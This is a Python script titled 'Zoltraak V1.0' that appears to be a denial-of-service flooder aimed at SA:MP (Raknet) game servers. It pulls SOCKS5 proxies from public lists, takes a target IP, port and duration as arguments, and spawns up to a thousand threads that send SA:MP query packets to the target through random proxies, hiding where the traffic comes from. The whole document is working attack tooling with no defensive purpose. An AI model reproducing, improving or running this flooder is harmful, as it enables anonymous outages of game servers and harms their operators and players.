import requests
import threading
import socket
import socks
import random
import sys
import struct
import time
import os

proxy_api_urls = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
    "https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt"                                                              ]

proxies = set()
for url in proxy_api_urls:
    response = requests.get(url)
    proxies.update(response.text.strip().replace('\r', '').split('\n'))

print("███████████████████████████")
print("███████▀▀▀░░░░░░░▀▀▀███████")
print("████▀░░░░░░░░░░░░░░░░░▀████")
print("███│░░░░░░░░░░░░░░░░░░░│███")
print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
print("██▌░│██████▌░░░▐██████│░▐██")
print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
print("████▄─┘██▌░░░░░░░▐██└─▄████")
print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
print("███████▄░░░░░░░░░░░▄███████")
print("██████████▄▄▄▄▄▄▄██████████")
print("███████Zoltraak V1.0███████")
print(f"█████████{len(proxies)} Proxy█████████")
print("███████Raknet SA:MP████████")
print("███████████████████████████")

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
times = int(sys.argv[3])
start_time = time.time()

blacklisted_proxies = set()
whitelisted_proxies = set()

def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

def tulis_proxy_ke_file():
    with open("prox.txt", "w") as file:
        for proxy in whitelisted_proxies:
            file.write(proxy + "\n")

def worker():
    global blacklisted_proxies
    target = (target_ip, target_port)
    proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
    proxy_host = proxy.split(":")[0]
    proxy_port = int(proxy.split(":")[1])
    udp = create_proxied_socket(proxy_host, proxy_port)

    while time.time() - start_time < times:
        if proxy not in blacklisted_proxies:
            try:
                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'p'
                udp.sendto(payload, target)

            except Exception as error:
                blacklisted_proxies.add(proxy)
                break
    return

while time.time() - start_time < times:
    while threading.active_count() >= 1000:
        pass
    threading.Thread(target=worker).start()

while time.time() - start_time > times:
     os._exit(0)
